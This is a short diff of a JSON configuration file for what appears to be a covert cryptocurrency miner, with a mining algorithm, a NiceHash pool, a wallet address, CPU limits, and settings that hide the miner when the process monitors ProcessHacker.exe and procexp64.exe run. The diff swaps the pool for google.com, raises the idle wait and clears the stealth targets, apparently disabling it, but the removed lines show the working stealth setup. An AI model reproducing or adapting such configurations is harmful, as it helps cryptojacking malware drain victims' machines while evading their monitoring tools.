@@ -1,15 +1,15 @@
 {
     "algo": "rx/0",
-    "pool": "autolykos.auto.nicehash.com",
-    "port": 9200,
+    "pool": "google.com",
+    "port": 0000,
     "wallet": "3JogVSeyJVWpVqN2W6QQbZaCkZJZuRM8Jz.USER-TM4109fzlmzJves",
     "password": "",
     "nicehash": false,
     "ssltls": false,
     "max-cpu": 10,
-    "idle-wait": 15,
+    "idle-wait": 820,
     "idle-cpu": 10,
-    "stealth-targets": "ProcessHacker.exe,procexp64.exe",
+    "stealth-targets": "",
     "kill-targets": "",
     "stealth-fullscreen": true
 }
